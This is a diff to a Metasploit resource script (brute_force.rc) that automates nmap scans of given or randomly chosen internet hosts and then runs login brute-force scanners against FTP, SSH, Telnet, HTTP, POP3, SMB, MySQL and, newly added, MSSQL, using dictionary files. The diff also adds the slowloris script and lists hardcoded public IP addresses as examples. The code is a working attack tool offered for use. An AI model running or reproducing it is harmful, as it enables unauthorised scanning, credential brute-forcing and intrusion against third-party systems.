@@ -4,13 +4,13 @@
 
         Description:
           setg SAVE_DB true - Save workspace redteam to database.xml
-          setg LIMMIT 1000 - Limmit the number of random rhosts to search
-          setg RANDOM_HOSTS true - To instruct db_nmap to random search for hosts with ports open
-          setg RHOSTS 216.15.177.33 61.228.36.253 - To instruct db_nmap to check targets for ports open
+          setg LIMMIT 1000 - Limmit the number of random WAN hosts to search
+          setg RANDOM_HOSTS true - To instruct db_nmap to random search in WAN for hosts with ports open
+          setg RHOSTS 216.15.177.33 61.228.36.253 - To instruct db_nmap to scan hosts for ports open
           setg USERPASS_FILE /root/my_dicionary.txt - To instruct auxiliarys to use our own dicionary file
-          brute_force.rc will use nmap to populate the msfdb database with remote hosts address, then it
-          trigger msf auxiliary/scanners based on target open port and service name discovery.
-          this module probes for 21:22:23:80:110:445:3306 remote TCP ports open.
+          brute_force.rc will use nmap to populate the msfdb database with remote hosts address then it
+          triggers msf auxiliary/scanners based on host(s) open port(s) and service name discovery.
+          This module probes for 21:22:23:80:110:445:1433:3306 remote TCP ports open.
 
         Execute in msfconsole:
           setg SAVE_DB <true-or-blank>
@@ -36,6 +36,7 @@
         return nil
       else
         print_good("Database connected to postgresql.")
+        local = Dir.pwd
         Rex::sleep(1.0)
       end
 
@@ -43,10 +44,10 @@
       if (framework.datastore['RANDOM_HOSTS'] == "true")
          if (framework.datastore['LIMMIT'] == nil or framework.datastore['LIMMIT'] == '')
            run_single("setg LIMMIT 300")
-           print_line("RHOSTS => db_nmap -sV -Pn -T4 -O -iR #{framework.datastore['LIMMIT']} -p 21,22,23,80,110,445,3306 --open --script=smb-os-discovery.nse,http-headers.nse")
+           print_line("RHOSTS => Random Search in WAN for:#{framework.datastore['LIMMIT']} alive hosts")
          else
            print_line("LIMMIT => #{framework.datastore['LIMMIT']}")
-           print_line("RHOSTS => db_nmap -sV -Pn -T4 -O -iR #{framework.datastore['LIMMIT']} -p 21,22,23,80,110,445,3306 --open --script=smb-os-discovery.nse,http-headers.nse")
+           print_line("RHOSTS => Random Search in WAN for:#{framework.datastore['LIMMIT']} alive hosts")
          end
       elsif (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
          run_single("setg RHOSTS 192.168.1.0/24")
@@ -61,10 +62,10 @@
 
       ## db_nmap WAN or RHOSTS scan settings
       unless (framework.datastore['RANDOM_HOSTS'] == "true")
-         run_single("db_nmap -sV -Pn -T4 -O -p 21,22,23,80,110,445,3306 --open --script=smb-os-discovery.nse,http-headers.nse #{framework.datastore['RHOSTS']}")
+         run_single("db_nmap -sV -Pn -T4 -O -p 21,22,23,80,110,445,1433,3306 --open --script=http-headers.nse,http-slowloris.nse #{framework.datastore['RHOSTS']}")
       else
-         print_warning("db_nmap: search for random remote targets with ports 21,22,23,80,110,445,3306 open")
-         run_single("db_nmap -sV -Pn -T4 -O -iR #{framework.datastore['LIMMIT']} -p 21,22,23,80,110,445,3306 --open --script=smb-os-discovery.nse,http-headers.nse")
+         print_good("Nmap: search for random remote hosts with ports 21:22:23:80:110:445:1433:3306 open")
+         run_single("db_nmap -sV -Pn -T5 -O -iR #{framework.datastore['LIMMIT']} -p 21,22,23,80,110,445,1433,3306 --open --script=http-headers.nse,http-slowloris.nse")
       end
 
       ## Read the database 
@@ -190,6 +191,21 @@
               run_single("exploit")
          end
 
+         if xport =~ /1433/i or proto =~ /ms-sql-s/i or proto =~ /mssql/i or proto =~ /mssql-m/i
+              print_warning("Remote Target port 1433 mssql found")
+              Rex::sleep(1.0)
+              run_single("use auxiliary/scanner/mssql/mssql_ping")
+              run_single("set THREADS 16")
+              print_line("")
+              run_single("services -c name -S mssql -R")
+              run_single("exploit")
+              run_single("use auxiliary/scanner/mssql/mssql_login")
+              run_single("set MSSQL_PASS_FILE /usr/share/metasploit-framework/data/wordlists/default_pass_for_services_unhash.txt")
+              print_line("")
+              run_single("services -c name -S mssql -R")
+              run_single("exploit")
+         end
+
          if xport =~ /3306/i or proto =~ /mysql/i
               print_warning("Remote Target port 3306 mysql found.")
               Rex::sleep(1.0)
@@ -236,7 +252,7 @@
       ## Save current database to local file (database.xml)
       if (framework.datastore['SAVE_DB'] == "true")
          rand = Rex::Text.rand_text_alpha(5)
-         print_warning("Exporting database to: database_#{rand}.xml")
+         print_warning("Exporting database to: #{local}/database_#{rand}.xml")
          run_single("db_export -f xml -a database_#{rand}.xml")
       end
 
@@ -248,6 +264,6 @@
       run_single("workspace -d redteam")
       run_single("back")
 
-      print_warning("Logfile stored under: brute_force.log")
+      print_warning("Logfile stored under: #{local}/brute_force.log")
       print_warning("https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md")
    </ruby>
